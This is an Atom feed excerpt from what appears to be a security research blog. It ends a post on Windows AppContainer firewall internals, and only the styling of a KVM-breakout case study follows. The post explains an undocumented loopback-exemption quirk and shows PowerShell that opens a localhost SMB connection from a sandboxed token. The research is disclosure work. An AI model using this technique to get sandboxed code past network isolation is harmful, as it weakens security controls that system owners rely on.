class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -AleLayer ConnectV4 | &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;Where-Object Name -Match AppContainerLoopback | &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c23"&gt;Format-FwFilter -FormatSecurityDescriptor -Summary&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c24"&gt;Action Type: CalloutInspection&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: dfe34c0f-84ca-4af1-9d96-8bf1e8dac8c0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 54912247&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: AppContainerLoopback&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_CONNECT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 18446744073709551615&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c35"&gt;Callout Key: FWPM_CALLOUT_RESERVED_AUTH_CONNECT_LAYER_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_USER_ID Equal &amp;nbsp; &amp;nbsp; D:(A;NP;CC;;;WD)(A;NP;CC;;;AN)(A;NP;CC;;;S-1-15-3-1861862962-...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;lt;DACL&amp;gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Everyone: (Allowed)(NoPropagateInherit)(Match)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;NT AUTHORITY\ANONYMOUS LOGON: (Allowed)(NoPropagateInherit)(Match)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c39"&gt;PACKAGE CAPABILITY\LOOPBACK: (Allowed)(NoPropagateInherit)(Match)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c39"&gt;LOOPBACK: (Allowed)(NoPropagateInherit)(Match)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;First we add a loopback exemption for the &lt;/span&gt;&lt;span class="c7"&gt;LOOPBACK&lt;/span&gt;&lt;span&gt;&amp;nbsp;package name. We then look for the &lt;/span&gt;&lt;span class="c7"&gt;AppContainerLoopback &lt;/span&gt;&lt;span&gt;filters in the connect layer. The one we&amp;#39;re interested in is shown. The first thing to note is that the action type is set to &lt;/span&gt;&lt;span class="c7"&gt;CalloutInspection&lt;/span&gt;&lt;span class="c2"&gt;. This might seem slightly surprising, you would expect it&amp;#39;d do something more than inspecting the traffic.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The name of the callout, &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CALLOUT_RESERVED_AUTH_CONNECT_LAYER_V4&lt;/span&gt;&lt;span&gt;&amp;nbsp;gives the game away. The fact that it has &lt;/span&gt;&lt;span class="c7"&gt;RESERVED&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the name can&amp;#39;t be a coincidence. This callout is one implemented internally by Windows in the &lt;/span&gt;&lt;span class="c7"&gt;TCPIP!WfpAlepDbgLowboxSetByPolicyLoopbackCalloutClassify&lt;/span&gt;&lt;span&gt;&amp;nbsp;function. This name now loses all mystery and pretty much explains what its purpose is, which is to configure the connection so that the &lt;/span&gt;&lt;span class="c7"&gt;IsReserved &lt;/span&gt;&lt;span class="c2"&gt;flag is set when the receive layer processes it.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The user ID here is equally important. When you register the loopback exemption you only specify the package SID, which is shown in the output as the last &amp;ldquo;LOOPBACK&amp;rdquo; line. Therefore you&amp;#39;d assume you&amp;#39;d need to always run your code within that package. However, the penultimate line is &lt;/span&gt;&lt;span class="c7"&gt;&amp;ldquo;PACKAGE CAPABILITY\LOOPBACK&amp;rdquo;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;which is my module&amp;#39;s way of telling you that this is the package SID, but converted to a capability SID. This is basically changing the first relative identifier in the SID from 2 to 3.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;We can use this behavior to simulate a generic loopback exemption capability. It allows you to create an AppContainer sandboxed process which has access to localhost which isn&amp;#39;t restricted to a particular package. This would be useful for applications such as Chrome to implement a network facing sandboxed process and would work from Windows 8 through &lt;/span&gt;&lt;span&gt;11.&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;. Unfortunately it&amp;#39;s not officially documented so can&amp;#39;t be relied upon. An example demonstrating the use of the capability is shown below.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.c5c3912b5466f474ed23b7f597087336a3689bd7"&gt;&lt;/a&gt;&lt;a id="t.25"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c23"&gt;$cap = Get-NtSid -PackageSid &amp;quot;LOOPBACK&amp;quot; -AsCapability&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$token = Get-NtToken -LowBox -PackageSid &amp;quot;TEST&amp;quot; -cap $cap&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$sock = Invoke-NtToken $token { &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;&amp;nbsp; &amp;nbsp; [System.Net.Sockets.TcpClient]::new(&amp;quot;127.0.0.1&amp;quot;, 445) &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$sock.Client.RemoteEndPoint&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;AddressFamily Address &amp;nbsp; Port&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------- ------- &amp;nbsp; ----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp;InterNetwork 127.0.0.1 &amp;nbsp;445&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;h2 class="c26" id="h.83prefam1lot"&gt;&lt;span class="c25"&gt;Conclusions&lt;/span&gt;&lt;/h2&gt; &lt;p class="c4"&gt;&lt;span&gt;That wraps up my quick overview of how AppContainer network restrictions are implemented using the Windows Firewall. I covered the basics of the Windows Firewall as well as covered some of my tooling I wrote to do analysis of the configuration. &lt;/span&gt;&lt;span&gt;This background information allowed me to explain why the&lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2207"&gt;&amp;nbsp;issue&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;I reported to Microsoft worked. &lt;/span&gt;&lt;span&gt;I also pointed out some of the quirks of the implementation which you might find of interest. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Having a good understanding of how a security feature works is an important step towards finding security issues. I hope that by providing both the background and tooling other researchers can also find similar issues and try and get them fixed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;</content>
    <link rel="replies" type="application/atom+xml" href="https://googleprojectzero.blogspot.com/feeds/1215474650509337553/comments/default" title="Post Comments" />
    <link rel="replies" type="text/html" href="https://googleprojectzero.blogspot.com/2021/08/understanding-network-access-windows-app.html#comment-form" title="0 Comments" />
    <link rel="edit" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1215474650509337553" />
    <link rel="self" type="application/atom+xml" href="https://www.blogger.com/feeds/4838136820032157985/posts/default/1215474650509337553" />
    <link rel="alternate" type="text/html" href="https://googleprojectzero.blogspot.com/2021/08/understanding-network-access-windows-app.html" title="Understanding Network Access in Windows AppContainers" />
    <author>
      <name>Ryan</name>
      <uri>http://www.blogger.com/profile/17011901605865574886</uri>
      <email>noreply@blogger.com</email>
      <gd:image rel="http://schemas.google.com/g/2005#thumbnail" width="16" height="16" src="https://img1.blogblog.com/img/b16-rounded.gif" />
    </author>
    <media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://1.bp.blogspot.com/-Qs5_JWZG96o/YRw9lp0x0pI/AAAAAAAAbhc/6_L_YwECUe4O7cqMv0Lv9dgRTIzFroddgCNcBGAsYHQ/s72-c/Firewall%2BArch.jpg" height="72" width="72" />
    <thr:total>0</thr:total>
  </entry>
  <entry>
    <id>tag:blogger.com,1999:blog-4838136820032157985.post-8408446653514773445</id>
    <published>2021-06-29T08:58:00.002-07:00</published>
    <updated>2021-06-29T09:31:17.503-07:00</updated>
    <title type="text">An EPYC escape: Case-study of a KVM breakout</title>
    <content type="html">&lt;style type="text/css"&gt;@import url('https://themes.googleusercontent.com/fonts/css?kit=cGvuclDC_Z1vE_cnVEU6AfLhOPS0h0oMHpEhTRSdXHM5KEqTDahEV1ECVSsZOMl9_kmCvy597kDopqFAXvpeaA');.lst-kix_xko68zpk7do4-7&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-7}ol.lst-kix_69oxjbhu0l4-6.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-6 0}ol.lst-kix_xko68zpk7do4-0.start{counter-reset:lst-ctn-kix_xko68zpk7do4-0 0}ol.lst-kix_44h6gatzfsnw-2{list-style-type:none}ol.lst-kix_xko68zpk7do4-6.start{counter-reset:lst-ctn-kix_xko68zpk7do4-6 0}ol.lst-kix_44h6gatzfsnw-1{list-style-type:none}ol.lst-kix_44h6gatzfsnw-0{list-style-type:none}ol.lst-kix_44h6gatzfsnw-6{list-style-type:none}ul.lst-kix_5qxqo8l30oy3-6{list-style-type:none}ol.lst-kix_44h6gatzfsnw-5{list-style-type:none}ul.lst-kix_5qxqo8l30oy3-5{list-style-type:none}ol.lst-kix_44h6gatzfsnw-4{list-style-type:none}ul.lst-kix_5qxqo8l30oy3-4{list-style-type:none}ol.lst-kix_44h6gatzfsnw-3{list-style-type:none}ul.lst-kix_5qxqo8l30oy3-3{list-style-type:none}.lst-kix_44h6gatzfsnw-4&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-4}ol.lst-kix_44h6gatzfsnw-8{list-style-type:none}ul.lst-kix_5qxqo8l30oy3-8{list-style-type:none}ol.lst-kix_44h6gatzfsnw-7{list-style-type:none}ul.lst-kix_5qxqo8l30oy3-7{list-style-type:none}ol.lst-kix_69oxjbhu0l4-0.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-0 0}.lst-kix_44h6gatzfsnw-6&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-6}.lst-kix_69oxjbhu0l4-6&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-6}ol.lst-kix_69oxjbhu0l4-1.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-1 0}.lst-kix_mpitsk6u2vh4-0&gt;li:before{content:"\0025cf  "}.lst-kix_mpitsk6u2vh4-3&gt;li:before{content:"\0025cf  "}.lst-kix_44h6gatzfsnw-8&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-8}.lst-kix_mpitsk6u2vh4-2&gt;li:before{content:"\0025a0  "}.lst-kix_mpitsk6u2vh4-1&gt;li:before{content:"\0025cb  "}.lst-kix_gmxrph3xv6dk-8&gt;li:before{content:"-  "}ul.lst-kix_yq73i8vx5c3y-7{list-style-type:none}.lst-kix_9lp8uyya2hbd-8&gt;li:before{content:"-  "}ul.lst-kix_yq73i8vx5c3y-6{list-style-type:none}.lst-kix_gmxrph3xv6dk-7&gt;li:before{content:"-  "}ul.lst-kix_yq73i8vx5c3y-5{list-style-type:none}.lst-kix_mpitsk6u2vh4-6&gt;li:before{content:"\0025cf  "}.lst-kix_mpitsk6u2vh4-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_yq73i8vx5c3y-4{list-style-type:none}ol.lst-kix_44h6gatzfsnw-4.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-4 0}ul.lst-kix_yq73i8vx5c3y-3{list-style-type:none}.lst-kix_9lp8uyya2hbd-6&gt;li:before{content:"-  "}.lst-kix_9lp8uyya2hbd-7&gt;li:before{content:"-  "}ul.lst-kix_yq73i8vx5c3y-2{list-style-type:none}ol.lst-kix_xko68zpk7do4-1.start{counter-reset:lst-ctn-kix_xko68zpk7do4-1 0}ul.lst-kix_yq73i8vx5c3y-1{list-style-type:none}.lst-kix_mpitsk6u2vh4-7&gt;li:before{content:"\0025cb  "}ul.lst-kix_yq73i8vx5c3y-0{list-style-type:none}.lst-kix_gmxrph3xv6dk-4&gt;li:before{content:"-  "}.lst-kix_xko68zpk7do4-3&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-3}.lst-kix_gmxrph3xv6dk-5&gt;li:before{content:"-  "}.lst-kix_mpitsk6u2vh4-4&gt;li:before{content:"\0025cb  "}.lst-kix_gmxrph3xv6dk-6&gt;li:before{content:"-  "}ul.lst-kix_5qxqo8l30oy3-2{list-style-type:none}ul.lst-kix_5qxqo8l30oy3-1{list-style-type:none}ul.lst-kix_5qxqo8l30oy3-0{list-style-type:none}.lst-kix_mpitsk6u2vh4-5&gt;li:before{content:"\0025a0  "}.lst-kix_69oxjbhu0l4-8&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-8}.lst-kix_gmxrph3xv6dk-0&gt;li:before{content:"-  "}.lst-kix_9lp8uyya2hbd-0&gt;li:before{content:"-  "}.lst-kix_9lp8uyya2hbd-1&gt;li:before{content:"-  "}.lst-kix_gmxrph3xv6dk-1&gt;li:before{content:"-  "}.lst-kix_69oxjbhu0l4-2&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-2}.lst-kix_9lp8uyya2hbd-2&gt;li:before{content:"-  "}.lst-kix_9lp8uyya2hbd-3&gt;li:before{content:"-  "}.lst-kix_xko68zpk7do4-0&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-0}.lst-kix_9lp8uyya2hbd-4&gt;li:before{content:"-  "}.lst-kix_9lp8uyya2hbd-5&gt;li:before{content:"-  "}.lst-kix_gmxrph3xv6dk-3&gt;li:before{content:"-  "}.lst-kix_gmxrph3xv6dk-2&gt;li:before{content:"-  "}ol.lst-kix_44h6gatzfsnw-5.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-5 0}.lst-kix_44h6gatzfsnw-2&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-2}.lst-kix_6q7katqp5wyr-6&gt;li:before{content:"\0025cf  "}.lst-kix_6q7katqp5wyr-8&gt;li:before{content:"\0025a0  "}.lst-kix_69oxjbhu0l4-1&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-1}.lst-kix_6q7katqp5wyr-2&gt;li:before{content:"\0025a0  "}ol.lst-kix_44h6gatzfsnw-3.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-3 0}ol.lst-kix_69oxjbhu0l4-2{list-style-type:none}ol.lst-kix_69oxjbhu0l4-3{list-style-type:none}ol.lst-kix_69oxjbhu0l4-0{list-style-type:none}ol.lst-kix_69oxjbhu0l4-1{list-style-type:none}ul.lst-kix_p3qtgxnpnwqf-0{list-style-type:none}ul.lst-kix_p3qtgxnpnwqf-1{list-style-type:none}ul.lst-kix_p3qtgxnpnwqf-2{list-style-type:none}ul.lst-kix_p3qtgxnpnwqf-3{list-style-type:none}ol.lst-kix_69oxjbhu0l4-8{list-style-type:none}ul.lst-kix_p3qtgxnpnwqf-4{list-style-type:none}.lst-kix_6q7katqp5wyr-4&gt;li:before{content:"\0025cb  "}ul.lst-kix_p3qtgxnpnwqf-5{list-style-type:none}.lst-kix_dvq5vbolwb6x-4&gt;li:before{content:"\0025cb  "}ol.lst-kix_69oxjbhu0l4-6{list-style-type:none}ul.lst-kix_p3qtgxnpnwqf-6{list-style-type:none}ul.lst-kix_h05x1pycvl0d-0{list-style-type:none}ol.lst-kix_69oxjbhu0l4-7{list-style-type:none}ul.lst-kix_p3qtgxnpnwqf-7{list-style-type:none}ol.lst-kix_69oxjbhu0l4-4{list-style-type:none}ul.lst-kix_p3qtgxnpnwqf-8{list-style-type:none}ul.lst-kix_h05x1pycvl0d-2{list-style-type:none}ol.lst-kix_69oxjbhu0l4-5{list-style-type:none}ul.lst-kix_h05x1pycvl0d-1{list-style-type:none}ul.lst-kix_h05x1pycvl0d-4{list-style-type:none}ul.lst-kix_h05x1pycvl0d-3{list-style-type:none}ul.lst-kix_h05x1pycvl0d-6{list-style-type:none}ul.lst-kix_h05x1pycvl0d-5{list-style-type:none}.lst-kix_dvq5vbolwb6x-6&gt;li:before{content:"\0025cf  "}.lst-kix_dvq5vbolwb6x-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_h05x1pycvl0d-8{list-style-type:none}ul.lst-kix_h05x1pycvl0d-7{list-style-type:none}.lst-kix_rg61eog4va0o-7&gt;li:before{content:"\0025cb  "}.lst-kix_69oxjbhu0l4-0&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-0}ul.lst-kix_gmxrph3xv6dk-6{list-style-type:none}ul.lst-kix_gmxrph3xv6dk-5{list-style-type:none}ul.lst-kix_gmxrph3xv6dk-8{list-style-type:none}ul.lst-kix_gmxrph3xv6dk-7{list-style-type:none}ul.lst-kix_gmxrph3xv6dk-2{list-style-type:none}ul.lst-kix_gmxrph3xv6dk-1{list-style-type:none}ol.lst-kix_44h6gatzfsnw-0.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-0 0}ul.lst-kix_gmxrph3xv6dk-4{list-style-type:none}ul.lst-kix_vu6o8yw128np-1{list-style-type:none}ul.lst-kix_gmxrph3xv6dk-3{list-style-type:none}ul.lst-kix_vu6o8yw128np-0{list-style-type:none}ul.lst-kix_qmksthfuerg1-0{list-style-type:none}ul.lst-kix_vu6o8yw128np-3{list-style-type:none}ul.lst-kix_vu6o8yw128np-2{list-style-type:none}ul.lst-kix_qmksthfuerg1-2{list-style-type:none}ul.lst-kix_gmxrph3xv6dk-0{list-style-type:none}ul.lst-kix_vu6o8yw128np-5{list-style-type:none}ul.lst-kix_qmksthfuerg1-1{list-style-type:none}ul.lst-kix_vu6o8yw128np-4{list-style-type:none}ul.lst-kix_qmksthfuerg1-4{list-style-type:none}ul.lst-kix_vu6o8yw128np-7{list-style-type:none}ul.lst-kix_qmksthfuerg1-3{list-style-type:none}ul.lst-kix_vu6o8yw128np-6{list-style-type:none}.lst-kix_z3dz91t3nune-1&gt;li:before{content:"\0025cb  "}ul.lst-kix_qmksthfuerg1-6{list-style-type:none}.lst-kix_p3qtgxnpnwqf-0&gt;li:before{content:"\0025cf  "}.lst-kix_p3qtgxnpnwqf-2&gt;li:before{content:"\0025a0  "}.lst-kix_vu6o8yw128np-0&gt;li:before{content:"-  "}.lst-kix_vu6o8yw128np-2&gt;li:before{content:"-  "}ul.lst-kix_qmksthfuerg1-5{list-style-type:none}ul.lst-kix_vu6o8yw128np-8{list-style-type:none}ul.lst-kix_qmksthfuerg1-8{list-style-type:none}ul.lst-kix_mpitsk6u2vh4-1{list-style-type:none}ul.lst-kix_qmksthfuerg1-7{list-style-type:none}ul.lst-kix_mpitsk6u2vh4-0{list-style-type:none}ul.lst-kix_mpitsk6u2vh4-3{list-style-type:none}ul.lst-kix_mpitsk6u2vh4-2{list-style-type:none}ul.lst-kix_mpitsk6u2vh4-5{list-style-type:none}ul.lst-kix_mpitsk6u2vh4-4{list-style-type:none}ul.lst-kix_mpitsk6u2vh4-7{list-style-type:none}.lst-kix_vu6o8yw128np-6&gt;li:before{content:"-  "}ul.lst-kix_mpitsk6u2vh4-6{list-style-type:none}.lst-kix_44h6gatzfsnw-3&gt;li{counter-increment:lst-ctn-kix_44h6gatzfsnw-3}ul.lst-kix_mpitsk6u2vh4-8{list-style-type:none}.lst-kix_rg61eog4va0o-1&gt;li:before{content:"\0025cb  "}.lst-kix_z3dz91t3nune-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_rg61eog4va0o-7{list-style-type:none}.lst-kix_rg61eog4va0o-3&gt;li:before{content:"\0025cf  "}ul.lst-kix_rg61eog4va0o-6{list-style-type:none}.lst-kix_p3qtgxnpnwqf-8&gt;li:before{content:"\0025a0  "}ul.lst-kix_rg61eog4va0o-5{list-style-type:none}ul.lst-kix_rg61eog4va0o-4{list-style-type:none}ul.lst-kix_rg61eog4va0o-3{list-style-type:none}ul.lst-kix_rg61eog4va0o-2{list-style-type:none}ul.lst-kix_rg61eog4va0o-1{list-style-type:none}ul.lst-kix_rg61eog4va0o-0{list-style-type:none}.lst-kix_p3qtgxnpnwqf-4&gt;li:before{content:"\0025cb  "}.lst-kix_p3qtgxnpnwqf-6&gt;li:before{content:"\0025cf  "}.lst-kix_vu6o8yw128np-4&gt;li:before{content:"-  "}ol.lst-kix_44h6gatzfsnw-1.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-1 0}.lst-kix_rg61eog4va0o-5&gt;li:before{content:"\0025a0  "}ul.lst-kix_rg61eog4va0o-8{list-style-type:none}.lst-kix_qmksthfuerg1-6&gt;li:before{content:"\0025cf  "}ol.lst-kix_44h6gatzfsnw-2.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-2 0}.lst-kix_fc4hxeeodeag-1&gt;li:before{content:"\0025cb  "}.lst-kix_qmksthfuerg1-0&gt;li:before{content:"\0025cf  "}.lst-kix_qmksthfuerg1-8&gt;li:before{content:"\0025a0  "}.lst-kix_fc4hxeeodeag-3&gt;li:before{content:"\0025cf  "}.lst-kix_6q7katqp5wyr-0&gt;li:before{content:"\0025cf  "}.lst-kix_vu6o8yw128np-8&gt;li:before{content:"-  "}.lst-kix_yq73i8vx5c3y-5&gt;li:before{content:"-  "}.lst-kix_xko68zpk7do4-5&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-5}.lst-kix_fc4hxeeodeag-7&gt;li:before{content:"\0025cb  "}.lst-kix_qmksthfuerg1-2&gt;li:before{content:"\0025a0  "}.lst-kix_z3dz91t3nune-5&gt;li:before{content:"\0025a0  "}.lst-kix_yq73i8vx5c3y-1&gt;li:before{content:"-  "}.lst-kix_yq73i8vx5c3y-3&gt;li:before{content:"-  "}.lst-kix_fc4hxeeodeag-5&gt;li:before{content:"\0025a0  "}.lst-kix_qmksthfuerg1-4&gt;li:before{content:"\0025cb  "}.lst-kix_z3dz91t3nune-7&gt;li:before{content:"\0025cb  "}.lst-kix_69oxjbhu0l4-1&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-1,lower-latin) ". "}.lst-kix_69oxjbhu0l4-3&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-3,decimal) ". "}.lst-kix_69oxjbhu0l4-2&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-2,lower-roman) ". "}.lst-kix_69oxjbhu0l4-7&gt;li{counter-increment:lst-ctn-kix_69oxjbhu0l4-7}.lst-kix_69oxjbhu0l4-5&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-5,lower-roman) ". "}.lst-kix_69oxjbhu0l4-4&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-4,lower-latin) ". "}.lst-kix_yq73i8vx5c3y-6&gt;li:before{content:"-  "}.lst-kix_xko68zpk7do4-6&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-6,decimal) ". "}.lst-kix_xko68zpk7do4-5&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-5,lower-roman) ". "}.lst-kix_yq73i8vx5c3y-7&gt;li:before{content:"-  "}ol.lst-kix_xko68zpk7do4-3.start{counter-reset:lst-ctn-kix_xko68zpk7do4-3 0}.lst-kix_xko68zpk7do4-4&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-4,lower-latin) ". "}.lst-kix_yq73i8vx5c3y-8&gt;li:before{content:"-  "}.lst-kix_xko68zpk7do4-2&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-2,lower-roman) ". "}.lst-kix_xko68zpk7do4-6&gt;li{counter-increment:lst-ctn-kix_xko68zpk7do4-6}.lst-kix_xko68zpk7do4-1&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-1,lower-latin) ". "}.lst-kix_xko68zpk7do4-3&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-3,decimal) ". "}.lst-kix_69oxjbhu0l4-0&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-0,decimal) ". "}ol.lst-kix_69oxjbhu0l4-3.start{counter-reset:lst-ctn-kix_69oxjbhu0l4-3 0}.lst-kix_h05x1pycvl0d-4&gt;li:before{content:"-  "}.lst-kix_h05x1pycvl0d-6&gt;li:before{content:"-  "}.lst-kix_xko68zpk7do4-0&gt;li:before{content:"" counter(lst-ctn-kix_xko68zpk7do4-0,decimal) ". "}.lst-kix_h05x1pycvl0d-1&gt;li:before{content:"-  "}.lst-kix_h05x1pycvl0d-5&gt;li:before{content:"-  "}.lst-kix_h05x1pycvl0d-0&gt;li:before{content:"-  "}.lst-kix_h05x1pycvl0d-8&gt;li:before{content:"-  "}ol.lst-kix_44h6gatzfsnw-7.start{counter-reset:lst-ctn-kix_44h6gatzfsnw-7 0}.lst-kix_h05x1pycvl0d-7&gt;li:before{content:"-  "}ul.lst-kix_6q7katqp5wyr-0{list-style-type:none}.lst-kix_44h6gatzfsnw-8&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-8,lower-roman) ". "}ul.lst-kix_6q7katqp5wyr-4{list-style-type:none}ul.lst-kix_6q7katqp5wyr-3{list-style-type:none}ul.lst-kix_6q7katqp5wyr-2{list-style-type:none}.lst-kix_69oxjbhu0l4-6&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-6,decimal) ". "}ul.lst-kix_6q7katqp5wyr-1{list-style-type:none}.lst-kix_44h6gatzfsnw-6&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-6,decimal) ". "}.lst-kix_69oxjbhu0l4-7&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-7,lower-latin) ". "}.lst-kix_h05x1pycvl0d-2&gt;li:before{content:"-  "}.lst-kix_44h6gatzfsnw-7&gt;li:before{content:"" counter(lst-ctn-kix_44h6gatzfsnw-7,lower-latin) ". "}.lst-kix_69oxjbhu0l4-8&gt;li:before{content:"" counter(lst-ctn-kix_69oxjbhu0l4-8,lower-roman) ". 